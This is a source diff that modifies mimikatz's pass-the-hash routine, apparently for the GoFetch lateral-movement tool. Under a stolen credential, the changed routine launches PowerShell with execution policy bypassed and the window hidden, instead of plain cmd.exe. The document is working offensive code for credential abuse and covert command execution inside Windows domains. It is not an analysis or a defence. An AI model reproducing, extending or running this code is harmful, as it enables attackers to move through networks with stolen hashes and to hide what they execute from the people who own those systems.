@@ -851,6 +851,8 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 	HANDLE hToken, hNewToken;
 	PROCESS_INFORMATION processInfos;
 	BOOL isImpersonate;
+	//GoFetch Change
+	LPWSTR powerShellCmd;
 
 	if(kull_m_string_args_byName(argc, argv, L"luid", &szLuid, NULL))
 	{
@@ -865,10 +867,32 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 			{
 				isImpersonate = kull_m_string_args_byName(argc, argv, L"impersonate", NULL, NULL);
 #pragma warning(push)
-#pragma warning(disable:4996)			
-				kull_m_string_args_byName(argc, argv, L"run", &szRun, isImpersonate ? _wpgmptr : L"cmd.exe");
+#pragma warning(disable:4996)
+
+				//GoFetch Change
+				//kull_m_string_args_byName(argc, argv, L"run", &szRun, isImpersonate ? _wpgmptr : L"cmd.exe");
+
+				//GoFetch Change
+				if (kull_m_string_args_byName(argc, argv, L"run", &szRun, isImpersonate ? _wpgmptr : L"powershell.exe"))
+				{
+					// L"powershell "
+					const wchar_t * command = L"powershell -ExecutionPolicy bypass -WindowStyle hidden -Noninteractive ";
+
+					powerShellCmd = (LPWSTR)LocalAlloc(LPTR, (DWORD)((wcslen(szRun) * sizeof(wchar_t)) +
+						(DWORD)((wcslen(command) * sizeof(wchar_t)) + sizeof(wchar_t))));
+					//powerShellCmd = (wchar_t*)malloc(sizeof(wchar_t)* (wcslen(szRun)));
+					wcscat(powerShellCmd, command);
+					wcscat(powerShellCmd, szRun);
+				}
+				else
+					powerShellCmd = L"powershell";
+
+
+
 #pragma warning(pop)
-				kprintf(L"user\t: %s\ndomain\t: %s\nprogram\t: %s\nimpers.\t: %s\n", szUser, szDomain, szRun, isImpersonate ? L"yes" : L"no");
+				//GoFetch Change
+				//kprintf(L"user\t: %s\ndomain\t: %s\nprogram\t: %s\nimpers.\t: %s\n", szUser, szDomain, szRun, isImpersonate ? L"yes" : L"no");
+				kprintf(L"user\t: %s\ndomain\t: %s\nprogram\t: %s\nimpers.\t: %s\n", szUser, szDomain, powerShellCmd, isImpersonate ? L"yes" : L"no");
 
 			}
 			else PRINT_ERROR(L"Missing argument : domain\n");
@@ -923,7 +947,9 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 		}
 		else
 		{
-			if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L"", &processInfos, FALSE))
+			//GoFetch Change
+			//if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L"", &processInfos, FALSE))
+			if (kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, powerShellCmd, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L"", &processInfos, FALSE))
 			{
 				kprintf(L"  |  PID  %u\n  |  TID  %u\n",processInfos.dwProcessId, processInfos.dwThreadId);
 				if(OpenProcessToken(processInfos.hProcess, TOKEN_READ | (isImpersonate ? TOKEN_DUPLICATE : 0), &hToken))
